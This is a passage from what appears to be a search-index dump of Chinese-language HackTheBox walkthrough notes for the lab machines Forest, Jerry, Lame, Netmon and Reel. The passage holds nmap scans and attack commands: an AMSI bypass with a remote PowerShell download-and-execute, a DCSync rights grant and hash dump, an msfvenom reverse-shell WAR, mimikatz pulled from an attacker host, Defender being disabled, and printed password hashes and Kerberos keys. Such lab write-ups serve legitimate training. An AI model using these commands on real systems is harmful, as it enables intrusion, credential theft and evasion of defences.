\u7528\u6237\u4e2d\u4f7f\u7528\u51ed\u636e\u8d4b\u4e88 newboy \u7528\u6237 <pre><code>[*Evil-WinRM* PS C:\\&gt; ]\nBypass-4MSI\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.18/PowerView.ps1\")\n\n$pass = convertto-securestring 'Admin@123' -asplain -force\n$cred = new-object system.management.automation.pscredential(\"htb\\newboy\", $pass)\n\nAdd-ObjectACL -PrincipalIdentity newboy -Credential $cred -Rights DCSync -Verbose\n</code></pre></li> <li><code>impacket-secretsdump htb/newboy:'Admin@123'@10.10.10.161</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n...\n</code></pre></li> <li><code>evil-winrm -i 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#dump-hash", "title": "Dump Hash", "text": "<p><code>impacket-secretsdump htb.local/administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::\nhtb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::\nhtb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::\nhtb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::\nhtb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::\nhtb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::\nhtb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::\nhtb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::\nhtb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::\nhtb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::\nhtb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::\nhtb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::\nhtb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::\nhtb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::\nhtb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::\nhtb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::\nhtb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::\namirr0r:9601:aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4:::\njohn:9603:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::\nybgm:9604:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nnewboy:9605:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::\nFOREST$:1000:aad3b435b51404eeaad3b435b51404ee:6e8994c29db248d6a8940013da1adf51:::\nEXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::\n[*] Kerberos keys grabbed\nhtb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913\nhtb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375\nhtb.local\\Administrator:des-cbc-md5:c1e049c71f57343b\nkrbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b\nkrbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58\nkrbtgt:des-cbc-md5:9dd5647a31518ca8\nhtb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4\nhtb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e\nhtb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e\nhtb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf\nhtb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd\nhtb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e\nhtb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e\nhtb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed\nhtb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983\nhtb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91\nhtb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f\nhtb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a\nhtb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c\nhtb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8\nhtb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d\nhtb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81\nhtb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6\nhtb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5\nhtb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a\nhtb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2\nhtb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29\nhtb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7\nhtb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538\nhtb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702\nhtb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352\nhtb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d\nhtb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701\nhtb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd\nhtb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36\nhtb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb\nhtb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c\nhtb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3\nhtb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054\nhtb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161\nhtb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a\nhtb.local\\sebastien:des-cbc-md5:702a3445e0d65b58\nhtb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5\nhtb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad\nhtb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce\nhtb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32\nhtb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea\nhtb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a\nhtb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f\nhtb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6\nhtb.local\\andy:des-cbc-md5:a2ab5eef017fb9da\nhtb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6\nhtb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81\nhtb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9\nhtb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427\nhtb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25\nhtb.local\\santi:des-cbc-md5:4075ad528ab9e5fd\namirr0r:aes256-cts-hmac-sha1-96:1bcb06ac63d36244df3f5e5caf71124272fb4f3a39a92f7388e0dae5c6a1e994\namirr0r:aes128-cts-hmac-sha1-96:4579d5cfdce40a61edd38e611ecb54a4\namirr0r:des-cbc-md5:942f64df5b4f68c4\njohn:aes256-cts-hmac-sha1-96:d62a736f49f88defdf75b0d9dde229c06e610deab92f16551e66f4a48c034aaf\njohn:aes128-cts-hmac-sha1-96:cc9cf4f03dd5bc20ce617ce19a6c0f1d\njohn:des-cbc-md5:b5b657cdc86d2668\nybgm:aes256-cts-hmac-sha1-96:aae35b403a49bd4de61ae7940d133fd83536ebfa8df38a0fd4c6530ff1ce2e40\nybgm:aes128-cts-hmac-sha1-96:27579d1809bf954ed207b29953da656e\nybgm:des-cbc-md5:6ed6ef2ca2a78ad0\nnewboy:aes256-cts-hmac-sha1-96:d533312c32ff8e95d6f13ede7a8afad597af756c949cf6705f2b725553cc750a\nnewboy:aes128-cts-hmac-sha1-96:c4bab311ffa4d502404bfde653621fa9\nnewboy:des-cbc-md5:1fdf7f20fbdf9e6d\nFOREST$:aes256-cts-hmac-sha1-96:023c099754f13d8ca68e585e41afd104fd2247b0e52c980e7dee488469144b6a\nFOREST$:aes128-cts-hmac-sha1-96:8a07f0e2c96fdb4ccb117e5174fa4a54\nFOREST$:des-cbc-md5:6b318a79c12a23a7\nEXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6\nEXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e\nEXCH01$:des-cbc-md5:8c45f44c16975129\n[*] Cleaning up...\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Jerry/", "title": "jerry", "text": ""}, {"location": "HackTheBox/Machines/Jerry/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.95 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone\nRunning (JUST GUESSING): Microsoft Windows 2012|Phone|8 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8\nAggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 8.1 Update 1 (85%)\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Jerry/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u67e5\u770b 8080 \u7aef\u53e3\uff0c\u53d1\u73b0 tomcat \u670d\u52a1 </li> <li>\u679a\u4e3e\u5f31\u5bc6\u7801 - tomcat/s3cret </li> <li>\u751f\u6210 war \u540e\u95e8\u5e76\u4e0a\u4f20 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp -a x64 LHOST=10.10.16.6 LPORT=2233 -f war -o reverse.war\n</code></pre> <code>curl http://tomcat:s3cret@10.10.10.95:8080/reverse/</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Jerry/#dump-hash", "title": "Dump Hash", "text": "<pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.6/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\nC:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit\n---\nAdministrator:fe34b627386c89a49eb254f6a267e4d9\n</code></pre>"}, {"location": "HackTheBox/Machines/Lame/", "title": "Lame", "text": ""}, {"location": "HackTheBox/Machines/Lame/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.3 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.16.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.23 (92%), DD-WRT v24-sp1 (Linux 2.4.36) (90%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.27 (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%), Linux 2.6.22 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: 2h30m17s, deviation: 3h32m09s, median: 16s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2024-01-08T00:23:47-05:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_smb2-time: Protocol negotiation failed (SMB2)\n</code></pre> - ftp   - samba <code>crackmapexec smb $IP -u guest -p '' --shares</code> <pre><code>SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)\nSMB         10.10.10.3      445    LAME             [-] hackthebox.gr\\guest: STATUS_LOGON_FAILURE\n</code></pre> </p>"}, {"location": "HackTheBox/Machines/Lame/#shell-as-root", "title": "Shell as Root", "text": "<p>\u6f0f\u6d1e\u7f16\u53f7\u4e3a: CVE-2007-2447  </p>"}, {"location": "HackTheBox/Machines/Lame/#dump-hash", "title": "Dump Hash", "text": "<p><code>cat /etc/shadow</code> <pre><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::\ndaemon:*:14684:0:99999:7:::\nbin:*:14684:0:99999:7:::\nsys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::\nsync:*:14684:0:99999:7:::\ngames:*:14684:0:99999:7:::\nman:*:14684:0:99999:7:::\nlp:*:14684:0:99999:7:::\nmail:*:14684:0:99999:7:::\nnews:*:14684:0:99999:7:::\nuucp:*:14684:0:99999:7:::\nproxy:*:14684:0:99999:7:::\nwww-data:*:14684:0:99999:7:::\nbackup:*:14684:0:99999:7:::\nlist:*:14684:0:99999:7:::\nirc:*:14684:0:99999:7:::\ngnats:*:14684:0:99999:7:::\nnobody:*:14684:0:99999:7:::\nlibuuid:!:14684:0:99999:7:::\ndhcp:*:14684:0:99999:7:::\nsyslog:*:14684:0:99999:7:::\nklog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::\nsshd:*:14684:0:99999:7:::\nbind:*:14685:0:99999:7:::\npostfix:*:14685:0:99999:7:::\nftp:*:14685:0:99999:7:::\npostgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::\nmysql:!:14685:0:99999:7:::\ntomcat55:*:14691:0:99999:7:::\ndistccd:*:14698:0:99999:7:::\nservice:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::\ntelnetd:*:14715:0:99999:7:::\nproftpd:!:14727:0:99999:7:::\nstatd:*:15474:0:99999:7:::\nsnmp:*:15480:0:99999:7:::\nmakis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Netmon/", "title": "Netmon", "text": ""}, {"location": "HackTheBox/Machines/Netmon/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.152 - <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.234</code> <pre><code>PORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-02-19  11:18PM                 1024 .rnd\n| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub\n| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs\n| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files\n| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)\n| 02-03-19  07:08AM       &lt;DIR&gt;          Users\n|_11-10-23  09:20AM       &lt;DIR&gt;          Windows\n| ftp-syst:\n|_  SYST: Windows_NT\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n|_http-server-header: PRTG/18.1.37.13946\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-01-09T03:28:19\n|_  start_date: 2024-01-09T03:24:35\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Netmon/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>FTP \u533f\u540d\u767b\u9646\uff0c\u53ef\u4ee5\u904d\u5386\u7cfb\u7edf\u6587\u4ef6 </li> <li>\u53d1\u73b0\u5b89\u88c5\u4e86 PRTG Network Monitor \u8f6f\u4ef6\uff0c\u770b\u4e00\u4e0b\u5e94\u7528\u6570\u636e  </li> <li>\u767b\u5f55 <code>prtgadmin/PrTg@dmin2018</code>  \u63d0\u793a\u5bc6\u7801\u9519\u8bef\uff0c\u7531\u4e8e\u662f\u5907\u4efd\u7684\u5bc6\u7801\uff0c\u8003\u8651\u65f6\u95f4\u95ee\u9898\uff0c\u5c1d\u8bd5 <code>PrTg@dmin2019,PrTg@dmin2020</code> \u7b49\u7ec4\u5408</li> <li>\u6b63\u786e\u5bc6\u7801: <code>prtgadmin/PrTg@dmin2019</code>\uff0c\u7ad9\u70b9\u53ef\u4ee5\u8bbe\u7f6e\u4e2d\u6587 </li> <li>\u4e3b\u9875\u6709\u7248\u672c\uff0c\u4f18\u5148\u67e5\u627e CVE  </li> <li>\u8ba4\u8bc1 RCE\uff0c\u5c1d\u8bd5\u5229\u7528 </li> <li>evil-winrm \u8fde\u63a5\u5df2\u6dfb\u52a0\u7684\u65b0\u7528\u6237 <code>pentest/P3nT3st!</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Netmon/#dump-hash", "title": "Dump Hash", "text": "<pre><code># \u5173\u95ed\u5b9e\u65f6\u9632\u62a4\n$preferences = Get-MpPreference\nSet-MpPreference -DisableRealtimeMonitoring (!$preferences.DisableRealtimeMonitoring) \n\npowershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.6/mimikatz.zip','C:\\Users\\pentest\\Documents\\mimikatz.zip')\nC:\\inetpub\\logs\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit\n\n---\nAdministrator:d0f73603a4d96655430fdf02de4afaee\n</code></pre>"}, {"location": "HackTheBox/Machines/Reel/", "title": "Reel", "text": ""}, {"location": "HackTheBox/Machines/Reel/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.77 - <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.252</code> <pre><code>PORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_05-28-18  11:19PM       &lt;DIR&gt;          documents\n| ftp-syst: \n|_  SYST: Windows_NT\n22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)\n|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)\n|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)\n25/tcp    open  smtp?\n| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: \n|     220 Mail Service ready\n|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|   Hello: \n|     220 Mail Service ready\n|     EHLO Invalid domain address.\n|   Help: \n|     220 Mail Service ready\n|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n|   SIPOptions: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|   TerminalServerCookie: \n|     220 Mail Service ready\n|_    sequence of commands\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49159/tcp open  msrpc        Microsoft Windows RPC\n...\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7\nAggressive OS guesses: 